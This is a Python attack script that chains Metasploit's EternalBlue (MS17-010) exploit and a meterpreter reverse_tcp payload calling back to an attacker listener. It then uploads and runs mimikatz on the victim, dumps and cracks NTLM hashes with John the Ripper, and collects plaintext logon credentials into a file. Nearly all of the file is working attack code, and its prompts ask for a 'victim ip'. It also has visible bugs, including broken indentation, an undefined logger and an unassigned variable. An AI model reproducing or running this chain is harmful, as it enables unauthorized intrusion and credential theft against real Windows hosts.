import os
import time	
import subprocess
import re
from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole


def power_mimikatz(log, pswd, mimikatz_directory, victim_ip):
	"""
	start mamkatz on victim`s computer
	"""
	res = subprocess.check_output(['winexe', '-U', log+'%'+pswd,
								   '//'+victim_ip, mimikatz_directory+
								   '\\mimikatz.exe privilege::debug '
								   'sekurlsa::logonPasswords full exit'])
	#decoding and parsing mimikatz result 
	res = res.decode("utf-8")
	login_pswd = re.findall("Username : ([\\s\\S]+?)\r\n[\\s\\S]+?"
							"Password : ([\\s\\S]+?)\r\n", res)
	#making dictionaries with "good_creds"
	good_cred = []
	for one_login_pswd in login_pswd:
		good_dict = {}
		if one_login_pswd[0] != '(null)' and one_login_pswd[1] != '(null)':
			good_dict['login'] = one_login_pswd[0]
			good_dict['password'] = one_login_pswd[1]
			good_cred.append(good_dict)
	return good_cred


def exploit(client, rhosts, lhosts, lport):
	"""
	start meterpreter session with victim`s computer
	"""
	try:
		#сhecking the system for the vulnerability of EternalBlue
		exploit = client.modules.use('auxiliary', 'scanner/smb/smb_ms17_010')
		exploit['RHOSTS'] = rhosts
		res = exploit.execute()
		#use enternal_blue exploit
		exploit = client.modules.use('exploit',
									 'windows/smb/ms17_010_eternalblue')
		exploit['RHOSTS'] = rhosts
		#creating payload
		payload = client.modules.use('payload',
									 'windows/x64/meterpreter/reverse_tcp')
		payload['LHOST'] = lhosts
		payload['LPORT'] = lport
		exploit.execute(payload=payload)
		#we shoud pause script on several seconds to make the exploit work
		time.sleep(5)
		return True
	except Exception as e:
            logger.exception(
                "Exploit failed! (You can add some "
				"'sleeps' while setting exploit)"
                f"exception: {e}"
            )
        raise e

def get_pswd_from_hash(filename):
	"""
	getting password from ntlm hash
	"""
	f = open(filename, 'r')
	data = f.read()
	data = data.split('\n')
	norm_user = ''
	for user in data:
		user_split = user.split(':')
		try:
			#first condition because of user`s ntlm begins after 999,
			# second because of true users haven`t got $ in name
			#this "if" is to get ntlm of user`s accounts
			# which was created manually
			if (int(user_split[1]) > 999) and (user_split[0].find('$') == -1):
				norm_user = user
				break
		except:
			continue

	#writing nt hash to file
	nt_from_user = norm_user.split(':')[3]
	fp = open('getting_hash.txt','w+')
	fp.write(norm_user)
	fp.close()

	#checking our getting nt hash in john.pot file
	#if nt hash in file we shuoldn`t brute it, just get it
	try:
		check_file = open('/root/.john/john.pot','r+').read().split('\n')
		all_hashs = []
		#getting all hash and brutting hash (passwords) in file
		for one_check_str in check_file:
			try:
				hash_and_pswd = dict()
				one_check_str = one_check_str.split('$')
				one_check_str = one_check_str[2].split(':')
				hash_and_pswd['nt_hash'] = one_check_str[0]
				hash_and_pswd['pswd']= one_check_str[1]
				all_hashs.append(hash_and_pswd)
			except:
				continue
	#if john.pot doesn`t exist
	except:
		all_hashs = []

	pswd = ''
	login= ''

	#compare getting hash and all hashes in john.pot
	for hashs in all_hashs:
		if nt_from_user == hashs['nt_hash']:
			pswd = hashs['pswd']

	#if there was no match in john.pot
	#starting brute
	if pswd == '':
		res = subprocess.check_output(['john', 'getting_hash.txt',
									   '--format=NT'])
		res = res.decode("utf-8").split('\n')
		log_pass = res[1].split('(')
		pswd = log_pass[0].strip()
		login = log_pass[1].split(')')[0]
	return login, pswd


def start_mimi(tmp_file, client, mimikatz_directory):
	"""
	Upload mimikatz to victim`s computer
	"""
	#getting all started sessions in MsfRpcd and choose the last
	last_session = list(client.sessions.list.keys())[-1]
	shell = client.sessions.session(str(last_session))
	# uploading mimikatz
	shell.write('mkdir C:/mimi/')
	shell.write('mkdir C:/mimi/Win32/')
	shell.write('mkdir C:/mimi/x64/')
	shell.write('upload ' + mimikatz_directory + ' C:/mimikatz/')
	shell.write('upload '+	mimikatz_directory + '/Win32 C:/mimi/Win32')
	shell.write('upload ' + mimikatz_directory + '/x64 C:/mimi/x64')
	shell.write('shell')
	shell.write('cd C:/mimi/x64')
	shell.write('mimikatz.exe')
	shell.write('privilege::debug')
	shell.write('sekurlsa::logonPasswords')
	passwords = shell.read()
	# the hash may not be obtained the first time
	while pswd == ' ':
		shell.write('hashdump')
		pswd = shell.read()
	fp = open(tmp_file, 'w+')
	fp.write(pswd)
	fp.close()

def main():
	tmp_file = 'd.txt'
	mimikatz_directory = input("enter mimikatz directory on your computer "
							   "(Ex: home/user/mimikatz): ")
	msf_rpc_client_password = input("enter MsfRpc password: ")
	victim_ip = input("enter victim ip: ")
	client = MsfRpcClient(msf_rpc_client_password, ssl="False")
	rhosts = input("enter rhost: ")
	lhosts = input("enter lhosts: ")
	lport = input("enter lport: ")
	exploit(client, rhosts, lhosts, lport)
	start_mimi(tmp_file, client, mimikatz_directory)
	login, pswd= get_pswd_from_hash(tmp_file)
	good_cred = power_mimikatz(str(login), str(pswd), mimikatz_directory,
							   victim_ip)
	with open('good_creds.txt', 'w') as f:
		f.write(good_cred)


if __name__ == "__main__":
	main()